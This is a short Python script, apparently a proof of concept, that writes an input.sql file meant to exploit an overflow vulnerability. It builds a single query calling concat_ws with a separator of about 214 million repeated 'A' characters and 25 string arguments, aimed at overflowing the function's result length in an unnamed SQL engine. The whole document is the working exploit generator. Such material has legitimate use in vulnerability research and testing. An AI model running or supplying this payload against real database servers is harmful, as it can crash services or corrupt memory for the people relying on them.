# Python script to generate an input.sql file that exploits the overflow vulnerability
def generate_input_sql(filename='input.sql', big_number=2147483647 // 10, num_elements=25):
    with open(filename, 'w') as f:
        # Constructing a large separator using REPEAT function. 
        # Using REPEAT('A', n) creates a string 'A'*n
        separator = f"REPEAT('A', {big_number})"
        
        # Constructing multiple arguments for concat_ws function
        elements = ", ".join([f"'string{i}'" for i in range(num_elements)])
        
        # Constructing the full SQL query
        sql_query = f"SELECT concat_ws({separator}, {elements});"
        
        # Writing the query to the file
        f.write(sql_query)


# Invoke the function to create 'input.sql'
generate_input_sql()
